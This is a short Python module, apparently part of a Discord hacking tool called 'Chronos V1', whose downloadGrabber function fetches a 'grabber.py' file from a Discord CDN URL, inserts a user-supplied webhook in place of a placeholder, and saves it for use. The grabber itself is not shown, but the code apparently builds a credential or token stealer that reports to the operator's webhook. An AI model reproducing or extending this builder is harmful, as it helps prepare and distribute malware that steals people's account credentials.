import requests
from utils.common import *

def downloadGrabber(webhook):
    set_console_title("Chronos V1 | Made by maxツ#8355 | Download Grabber")
    url = 'https://cdn.discordapp.com/attachments/1014530090794766482/1014605376471183390/grabber.py'
    r = requests.get(url, allow_redirects=True)
    open('output/grabber.py', 'w', encoding='utf-8').write(r.content.decode().replace("WEBHOOK HERE", webhook))
    print(f"{Fore.WHITE}\n[ {Fore.LIGHTCYAN_EX}C {Fore.WHITE}] Downloaded Successfully | File in {Fore.LIGHTCYAN_EX}/output/grabber.py{Fore.RESET}\n")
    input('Press any key to continue')